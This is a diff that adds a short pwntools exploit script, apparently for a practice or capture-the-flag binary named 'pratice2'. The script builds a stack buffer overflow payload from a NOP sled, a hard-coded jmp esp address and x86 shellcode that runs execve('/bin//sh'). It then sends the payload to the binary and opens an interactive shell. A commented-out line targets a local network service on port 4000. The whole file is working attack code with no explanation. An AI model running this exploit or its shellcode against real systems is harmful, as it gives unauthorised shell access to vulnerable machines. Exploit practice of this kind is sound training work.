@@ -1,0 +1,15 @@
+from pwn import *
+
+shellcode = "\x31\xc0\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\xcd\x80"
+
+jmp_esp = 0x8048410
+
+#s = remote('127.0.0.1', 4000)
+s = process('./pratice2')
+
+p = '\x90' * 32
+p += p32(jmp_esp)
+p += shellcode
+
+s.sendline(p)
+s.interactive()
